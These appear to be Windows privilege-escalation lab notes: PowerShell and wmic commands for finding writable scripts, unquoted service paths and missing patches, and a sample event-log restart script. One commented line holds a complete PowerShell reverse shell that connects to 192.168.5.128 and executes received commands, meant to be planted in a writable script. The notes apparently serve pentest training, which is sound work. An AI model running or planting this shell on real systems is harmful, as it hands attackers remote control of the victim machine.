#PowerShell:
############

#Finding Misconfigured Permissions

whoami

net user tom /domain

Get-ChildItem C:\ -Force -Recurse -Include *.exe,*.ps1

Get-ChildItem C:\ -Force -Recurse -Include *.exe,*.ps1 -ErrorAction SilentlyContinue

Get-ChildItem C:\ -Force -Recurse -Include *.exe,*.ps1 -ErrorAction SilentlyContinue | Get-Acl

Get-ChildItem C:\ -Force -Recurse -Include *.exe,*.ps1 -ErrorAction SilentlyContinue | Get-Acl | Out-String -Stream | Select-String -Pattern "Users Allow  FullControl"

#We pretend we have found a script that reboots the event log service
Get-ChildItem C:\ -Recurse -Filter "reboot-event.ps1" -ErrorAction SilentlyContinue

########
#Script reboot the event log service
########

Write-Host ">> Rebooting Event Logs"
Restart-Service -Name Eventlog -Force
Write-Host ">> DONE!"

#Create a reverse shell (remove the #)
# $client = New-Object System.Net.Sockets.TCPClient('192.168.5.128',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()


#Command Prompt:
################

#Unquoted Service Paths

wmic service

wmic service get name,displayname,pathname,startmode

wmic service get name,displayname,pathname,startmode | findstr /i "auto"

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\"

wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
"

#PowerShell:
############

#Finding Missing Patches and Outdated Software

(New-Object -ComObject Microsoft.Update.Session).CreateupdateSearcher().Search("IsHidden=0 and IsInstalled=0").Updates | Select-Object Title

Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object Displayname,Publisher,Version,Installdate

Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object Displayname,Publisher,Version,Installdate